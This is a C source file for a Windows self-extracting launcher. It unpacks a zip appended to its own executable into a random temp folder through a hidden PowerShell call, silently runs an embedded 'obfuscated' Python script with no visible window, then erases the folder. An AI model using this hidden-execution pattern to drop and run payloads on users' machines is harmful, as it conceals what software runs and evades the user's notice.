/*
 * Self-extracting launcher for obfuscated Python payload.
 * Cross-compiled with: x86_64-w64-mingw32-gcc
 *
 * Extracts embedded zip payload to %TEMP%\<random>, runs the script,
 * then cleans up on exit.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <shlobj.h>

/* Payload marker - we append the zip after this in the EXE */
#define MARKER "~~PAYLOAD_START~~"
#define MARKER_LEN 17

/* Forward declarations */
static int find_payload(const char *exe_path, DWORD *offset, DWORD *size);
static int extract_zip(const char *exe_path, DWORD offset, DWORD size, const char *dest);
static void rmdir_recursive(const char *path);
static void random_dirname(char *buf, int len);

/* Hide console window */
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    char exe_path[MAX_PATH];
    char temp_dir[MAX_PATH];
    char extract_dir[MAX_PATH];
    char python_exe[MAX_PATH];
    char script_path[MAX_PATH];
    char cmd[MAX_PATH * 3];
    DWORD payload_offset, payload_size;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    /* Get our own path */
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    /* Find payload in our own exe */
    if (!find_payload(exe_path, &payload_offset, &payload_size)) {
        /* No embedded payload - try external mode */
        return 1;
    }

    /* Create temp extraction directory */
    GetTempPathA(MAX_PATH, temp_dir);
    srand((unsigned)time(NULL) ^ GetCurrentProcessId());
    char rand_name[12];
    random_dirname(rand_name, 8);
    snprintf(extract_dir, MAX_PATH, "%s%s", temp_dir, rand_name);
    CreateDirectoryA(extract_dir, NULL);

    /* Extract payload zip */
    char zip_path[MAX_PATH];
    snprintf(zip_path, MAX_PATH, "%s\\payload.zip", extract_dir);

    /* Write zip to temp file */
    FILE *src = fopen(exe_path, "rb");
    FILE *dst = fopen(zip_path, "wb");
    if (!src || !dst) return 1;

    fseek(src, payload_offset, SEEK_SET);
    char buf[8192];
    DWORD remaining = payload_size;
    while (remaining > 0) {
        DWORD chunk = remaining > sizeof(buf) ? sizeof(buf) : remaining;
        DWORD read = (DWORD)fread(buf, 1, chunk, src);
        if (read == 0) break;
        fwrite(buf, 1, read, dst);
        remaining -= read;
    }
    fclose(src);
    fclose(dst);

    /* Extract zip using PowerShell (available on all modern Windows) */
    snprintf(cmd, sizeof(cmd),
        "powershell.exe -NoProfile -NonInteractive -Command "
        "\"Expand-Archive -Force -Path '%s' -DestinationPath '%s'\" >nul 2>&1",
        zip_path, extract_dir);

    /* Hide the powershell window */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Delete the zip */
    DeleteFileA(zip_path);

    /* Run the Python script */
    snprintf(python_exe, MAX_PATH, "%s\\python_runtime\\python.exe", extract_dir);
    snprintf(script_path, MAX_PATH, "%s\\python_runtime\\__main__.py", extract_dir);
    snprintf(cmd, sizeof(cmd), "\"%s\" \"%s\"", python_exe, script_path);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, extract_dir, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Cleanup */
    rmdir_recursive(extract_dir);

    return 0;
}

static int find_payload(const char *exe_path, DWORD *offset, DWORD *size) {
    FILE *f = fopen(exe_path, "rb");
    if (!f) return 0;

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);

    /* Search for marker from the end (faster) */
    long search_start = file_size - 1024 * 1024; /* last 1MB */
    if (search_start < 0) search_start = 0;

    fseek(f, search_start, SEEK_SET);
    long buf_size = file_size - search_start;
    char *data = (char *)malloc(buf_size);
    fread(data, 1, buf_size, f);

    int found = 0;
    for (long i = 0; i < buf_size - MARKER_LEN; i++) {
        if (memcmp(data + i, MARKER, MARKER_LEN) == 0) {
            *offset = (DWORD)(search_start + i + MARKER_LEN);
            *size = (DWORD)(file_size - *offset);
            found = 1;
            break;
        }
    }

    free(data);
    fclose(f);
    return found;
}

static void rmdir_recursive(const char *path) {
    char search_path[MAX_PATH];
    char file_path[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hFind;

    snprintf(search_path, MAX_PATH, "%s\\*", path);
    hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        snprintf(file_path, MAX_PATH, "%s\\%s", path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            rmdir_recursive(file_path);
        } else {
            DeleteFileA(file_path);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    RemoveDirectoryA(path);
}

static void random_dirname(char *buf, int len) {
    static const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < len; i++) {
        buf[i] = chars[rand() % (sizeof(chars) - 1)];
    }
    buf[len] = '\0';
}
